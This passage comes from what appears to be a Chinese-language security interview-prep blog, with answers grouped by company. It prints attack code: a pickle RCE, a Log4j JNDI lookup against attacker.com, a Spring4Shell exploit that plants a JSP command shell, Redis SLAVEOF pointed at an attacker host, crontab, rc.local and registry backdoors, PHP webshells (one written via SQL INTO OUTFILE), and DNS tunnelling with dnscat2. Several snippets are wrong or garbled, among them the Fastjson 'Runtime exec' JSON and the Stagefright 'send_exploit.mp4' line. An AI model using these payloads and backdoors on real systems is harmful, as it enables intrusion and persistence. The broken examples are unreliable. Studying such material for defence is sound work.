class="string">&#x27;O:14:&quot;MaliciousClass&quot;:0:&#123;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Python-反序列化"><a href="#Python-反序列化" class="headerlink" title="Python 反序列化"></a>Python 反序列化</h4><ul>
<li><strong>不需要利用链</strong>：Python 的 <code>pickle</code> 模块支持 <code>__reduce__</code> 方法，可以直接构造命令执行。</li>
<li><strong>示例</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">malicious = MaliciousClass()</span><br><span class="line">serialized = pickle.dumps(malicious)</span><br><span class="line">pickle.loads(serialized)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><ul>
<li><strong>宽字节注入</strong>：利用多字节字符编码（如GBK）中的一些特性，通过注入特殊字符（如 <code>%bf%27</code>）来绕过输入验证。</li>
<li><strong>示例</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1%bf%27&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Log4j-如何绕过-trustcodebase"><a href="#Log4j-如何绕过-trustcodebase" class="headerlink" title="Log4j 如何绕过 trustcodebase"></a>Log4j 如何绕过 trustcodebase</h3><ul>
<li><strong>Log4j 绕过</strong>：通过构造特殊的 JNDI URI 来加载恶意类，绕过 <code>trustcodebase</code> 的限制。</li>
<li><strong>示例</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jndiUri</span> <span class="operator">=</span> <span class="string">&quot;rmi://attacker.com/malicious&quot;</span>;</span><br><span class="line"><span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">logger.info(<span class="string">&quot;$&#123;jndi:&quot;</span> + jndiUri + <span class="string">&quot;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Springboot-Shiro-环境如何进行渗透"><a href="#Springboot-Shiro-环境如何进行渗透" class="headerlink" title="Springboot+Shiro 环境如何进行渗透"></a>Springboot+Shiro 环境如何进行渗透</h3><ul>
<li><strong>渗透方法</strong>：利用 Shiro 的反序列化漏洞，构造恶意序列化数据来执行命令。</li>
<li><strong>示例</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;your-key&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;malicious-data&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] encrypted = aes.encrypt(data.getBytes(), key.getBytes()).getBytes();</span><br><span class="line">        System.out.println(ByteSource.Util.bytesToHex(encrypted));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="实战中如何判断-Fastjson-的版本"><a href="#实战中如何判断-Fastjson-的版本" class="headerlink" title="实战中如何判断 Fastjson 的版本"></a>实战中如何判断 Fastjson 的版本</h3><ul>
<li><strong>判断版本</strong>：通过发送特定的请求，观察返回的错误信息或响应内容来判断版本。</li>
<li><strong>示例</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;java.lang.Runtime&quot;,&quot;exec&quot;:&quot;ls&quot;&#125;&#x27;</span> http://target.com/api</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Fastjson-文件读写-gadget"><a href="#Fastjson-文件读写-gadget" class="headerlink" title="Fastjson 文件读写 gadget"></a>Fastjson 文件读写 gadget</h3><ul>
<li><strong>文件读写 gadget</strong>：利用 Fastjson 的反序列化漏洞，通过特定的 gadget 链来读写文件。</li>
<li><strong>示例</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;exec\&quot;:\&quot;touch /tmp/test\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="内存马类型，如何检测"><a href="#内存马类型，如何检测" class="headerlink" title="内存马类型，如何检测"></a>内存马类型，如何检测</h3><ul>
<li><strong>内存马</strong>：通过在内存中注入恶意代码来持久化攻击。</li>
<li><strong>检测方法</strong>：通过监控进程内存、检查异常的内存分配和代码执行行为。</li>
<li><strong>示例</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用工具如 Volatility 检测内存马</span></span><br><span class="line">volatility -f memory.dmp --profile=Win7SP1x64 malfind</span><br></pre></td></tr></table></figure>

<h3 id="Spring4Shell-原理、检测与利用"><a href="#Spring4Shell-原理、检测与利用" class="headerlink" title="Spring4Shell 原理、检测与利用"></a>Spring4Shell 原理、检测与利用</h3></li>
</ul>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Spring4Shell（CVE-2022-22965）是一个存在于 Spring 框架中的远程代码执行漏洞。该漏洞允许攻击者通过特制的 HTTP 请求在目标服务器上执行任意代码。漏洞的关键点在于 Spring 框架对嵌套属性的解析，特别是通过 <code>BeanWrapperImpl</code> 对象的属性访问和设置。攻击者可以利用这一机制，通过构造恶意的参数链，最终调用 <code>AccessLogValve.setPattern</code> 方法，将恶意代码写入日志文件并执行。</p>
<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul>
<li><strong>自动化工具</strong>：使用如 <code>spring4shell-scan</code> 这样的工具进行检测。该工具通过发送特制的 HTTP 请求并分析响应来判断是否存在漏洞。</li>
<li><strong>手动检测</strong>：通过构造 POC（Proof of Concept）请求，观察服务器响应是否包含预期的输出。</li>
</ul>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul>
<li><strong>POC 示例</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://target.com&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&#x27;j&#x27;.equals(request.getParameter(&#x27;pwd&#x27;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&#x27;cmd&#x27;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="安卓系统如何进行-RCE"><a href="#安卓系统如何进行-RCE" class="headerlink" title="安卓系统如何进行 RCE"></a>安卓系统如何进行 RCE</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li><strong>应用漏洞</strong>：利用安卓应用中的漏洞，如未正确验证输入、未加密敏感数据等。</li>
<li><strong>系统漏洞</strong>：利用安卓系统本身的漏洞，如 Stagefright 漏洞。</li>
<li><strong>第三方库漏洞</strong>：利用应用中使用的第三方库的漏洞。</li>
<li><strong>社会工程学</strong>：通过诱导用户安装恶意应用或点击恶意链接。</li>
</ol>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>利用 Stagefright 漏洞</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送特制的 MP4 文件到目标设备</span></span><br><span class="line">send_exploit.mp4 to target_device</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="移动端-App-服务端是-Cloud-环境的利用思路"><a href="#移动端-App-服务端是-Cloud-环境的利用思路" class="headerlink" title="移动端 App 服务端是 Cloud 环境的利用思路"></a>移动端 App 服务端是 Cloud 环境的利用思路</h3><ol>
<li><strong>API 漏洞</strong>：检查 API 端点是否存在未授权访问、SQL 注入等漏洞。</li>
<li><strong>配置错误</strong>：检查云服务配置是否安全，如存储桶权限、API 密钥等。</li>
<li><strong>中间件漏洞</strong>：利用云服务中的中间件漏洞，如 Spring4Shell。</li>
<li><strong>社会工程学</strong>：通过社会工程学获取管理员凭证。</li>
</ol>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>检查 API 端点</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://api.cloudservice.com/data</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Shiro-如何绕-WAF"><a href="#Shiro-如何绕-WAF" class="headerlink" title="Shiro 如何绕 WAF"></a>Shiro 如何绕 WAF</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li><strong>编码混淆</strong>：对请求进行 URL 编码或 Base64 编码。</li>
<li><strong>拆分请求</strong>：将恶意请求拆分为多个部分，分别发送。</li>
<li><strong>协议特性</strong>：利用 HTTP 头或 Cookie 参数注入。</li>
</ol>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>编码混淆</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Authorization: Basic <span class="subst">$(echo -n <span class="string">&quot;admin:<span class="subst">$(python -c &#x27;print <span class="string">&quot;malicious_code&quot;</span>.encode(<span class="string">&quot;base64&quot;</span>)</span>&#x27;)&quot;</span>)</span>&quot;</span> http://target.com</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Weblogic-打站遇到-WAF-的操作"><a href="#Weblogic-打站遇到-WAF-的操作" class="headerlink" title="Weblogic 打站遇到 WAF 的操作"></a>Weblogic 打站遇到 WAF 的操作</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li><strong>请求混淆</strong>：对请求进行编码或拆分。</li>
<li><strong>绕过规则</strong>：利用 WAF 的规则漏洞，如大小写敏感、特殊字符过滤不严等。</li>
<li><strong>代理转发</strong>：通过代理服务器转发请求，避免 IP 被封禁。</li>
</ol>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>使用代理</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -X POST -d <span class="string">&quot;payload&quot;</span> http://target.com</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Jboss-反序列化原理"><a href="#Jboss-反序列化原理" class="headerlink" title="Jboss 反序列化原理"></a>Jboss 反序列化原理</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>Jboss 使用 Java 的序列化和反序列化机制来传输对象。攻击者可以构造恶意的序列化对象，通过反序列化触发漏洞，执行任意代码。</p>
<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul>
<li><strong>POC 示例</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JbossExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> <span class="title class_">MaliciousObject</span>());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line">        <span class="comment">// 发送 payload 到 Jboss 服务器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Redis-攻击、主从复制利用条件及原理"><a href="#Redis-攻击、主从复制利用条件及原理" class="headerlink" title="Redis 攻击、主从复制利用条件及原理"></a>Redis 攻击、主从复制利用条件及原理</h3><h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><ol>
<li><strong>未授权访问</strong>：直接连接到 Redis 服务器，执行命令。</li>
<li><strong>主从复制</strong>：通过配置从节点，获取主节点的数据。</li>
</ol>
<h4 id="主从复制原理"><a href="#主从复制原理" class="headerlink" title="主从复制原理"></a>主从复制原理</h4><ul>
<li><strong>条件</strong>：从节点需要能够连接到主节点，并且主节点允许复制请求。</li>
<li><strong>原理</strong>：从节点发送 <code>SLAVEOF</code> 命令到主节点，主节点将数据同步到从节点。</li>
</ul>
<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><ul>
<li><strong>获取 Shell</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 SLAVEOF attacker_host 6379</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="TCP-和-UDP-不出网的代理策略"><a href="#TCP-和-UDP-不出网的代理策略" class="headerlink" title="TCP 和 UDP 不出网的代理策略"></a>TCP 和 UDP 不出网的代理策略</h3><h4 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h4><ol>
<li><strong>HTTP 代理</strong>：通过 HTTP 代理转发请求。</li>
<li><strong>SOCKS 代理</strong>：使用 SOCKS 代理进行流量转发。</li>
<li><strong>隧道技术</strong>：使用隧道技术如 SSH 隧道。</li>
</ol>
<h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><ul>
<li><strong>SSH 隧道</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@attacker_host</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><h3 id="JSONP-原理及绕过方法"><a href="#JSONP-原理及绕过方法" class="headerlink" title="JSONP 原理及绕过方法"></a>JSONP 原理及绕过方法</h3><h4 id="JSONP-原理"><a href="#JSONP-原理" class="headerlink" title="JSONP 原理"></a>JSONP 原理</h4><p>JSONP（JSON with Padding）是一种用于解决跨域请求的技术。它利用了 <code>&lt;script&gt;</code> 标签的 src 属性不受同源策略限制的特性，通过动态创建 <code>&lt;script&gt;</code> 标签来请求数据，并以回调函数的形式处理响应。</p>
<h4 id="JSONP-绕过方法"><a href="#JSONP-绕过方法" class="headerlink" title="JSONP 绕过方法"></a>JSONP 绕过方法</h4><ol>
<li><p><strong>Referer 过滤不严谨</strong>：</p>
<ul>
<li>攻击者可以构造 URL 来绕过 Referer 验证，例如利用 Referer 中的关键字。</li>
<li>示例：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>空 Referer 绕过</strong>：</p>
<ul>
<li>利用 <code>&lt;meta&gt;</code> 标签或 <code>iframe</code> 标签调用 JavaScript 伪协议来实现空 Referer 绕过。</li>
<li>示例：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://aphp.test/jsonp/test_jsonp.php?callback=jsonCallback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Callback 可定义导致的安全问题</strong>：</p>
<ul>
<li>如果 Callback 函数名没有严格过滤，可能导致 XSS 攻击。</li>
<li>示例：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$callback</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;\&quot;data\&quot;:\&quot;value\&quot;&#125;)&quot;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="DOM型XSS扫描器编写"><a href="#DOM型XSS扫描器编写" class="headerlink" title="DOM型XSS扫描器编写"></a>DOM型XSS扫描器编写</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>DOM型XSS扫描器需要检测页面中的动态行为，特别是事件属性和用户交互。可以通过自动化测试工具或手动检测来发现潜在的XSS漏洞。</p>
<h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><ol>
<li><p><strong>检测事件属性</strong>：</p>
<ul>
<li>遍历页面中的所有元素，检测 <code>onclick</code>、<code>onmouseover</code> 等事件属性。</li>
<li>示例：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> elements = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">elements.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> attributes = element.<span class="property">attributes</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; attributes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> attr = attributes[i];</span><br><span class="line">        <span class="keyword">if</span> (attr.<span class="property">name</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;on&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Element: <span class="subst">$&#123;element.tagName&#125;</span>, Event: <span class="subst">$&#123;attr.name&#125;</span>, Value: <span class="subst">$&#123;attr.value&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>动态触发事件</strong>：</p>
<ul>
<li>使用自动化测试库（如 Selenium）模拟用户点击、鼠标移动等行为，观察是否有XSS漏洞。</li>
<li>示例（Selenium）：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">element = driver.find_element_by_id(<span class="string">&#x27;vulnerable_element&#x27;</span>)</span><br><span class="line">element.click()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>人工判断</strong>：</p>
<ul>
<li>结合自动化检测结果，人工分析潜在的XSS漏洞，确认是否存在实际风险。</li>
</ul>
</li>
</ol>
<h3 id="Linux主机留后门的各种方式"><a href="#Linux主机留后门的各种方式" class="headerlink" title="Linux主机留后门的各种方式"></a>Linux主机留后门的各种方式</h3><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ul>
<li><strong>crontab</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"><span class="comment"># 添加以下内容</span></span><br><span class="line">* * * * * /path/to/malicious_script.sh</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="自启动后门"><a href="#自启动后门" class="headerlink" title="自启动后门"></a>自启动后门</h4><ul>
<li><strong>rc.local</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/path/to/malicious_script.sh&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h4><ul>
<li><strong>上传 Webshell</strong>：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="写注册表（Windows）"><a href="#写注册表（Windows）" class="headerlink" title="写注册表（Windows）"></a>写注册表（Windows）</h4><ul>
<li><strong>注册表启动项</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v Malicious /t REG_SZ /d <span class="string">&quot;C:\path\to\malicious.exe&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="DNS隧道搭建方式"><a href="#DNS隧道搭建方式" class="headerlink" title="DNS隧道搭建方式"></a>DNS隧道搭建方式</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>DNS隧道利用DNS协议传输数据，通过将数据封装在DNS请求和响应中，绕过网络限制。</p>
<h4 id="实现步骤-1"><a href="#实现步骤-1" class="headerlink" title="实现步骤"></a>实现步骤</h4><ol>
<li><p><strong>选择工具</strong>：</p>
<ul>
<li>常用工具：<code>dnscat2</code>、<code>iodine</code>、<code>dns tunnel</code>等。</li>
</ul>
</li>
<li><p><strong>服务器端配置</strong>：</p>
<ul>
<li>以 <code>dnscat2</code> 为例：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dnscat2 -server -domain example.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>客户端连接</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-client -server example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>数据传输</strong>：</p>
<ul>
<li>通过DNS请求和响应传输数据，建立隧道。</li>
</ul>
</li>
</ol>
<h2 id="奇安信"><a href="#奇安信" class="headerlink" title="奇安信"></a>奇安信</h2><h3 id="SQL-注入写马的方式"><a href="#SQL-注入写马的方式" class="headerlink" title="SQL 注入写马的方式"></a>SQL 注入写马的方式</h3><ul>
<li><strong>利用 INTO OUTFILE</strong>：将查询结果写入文件，要求数据库用户有 FILE 权限，且文件路径必须是绝对路径，文件不能已存在。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
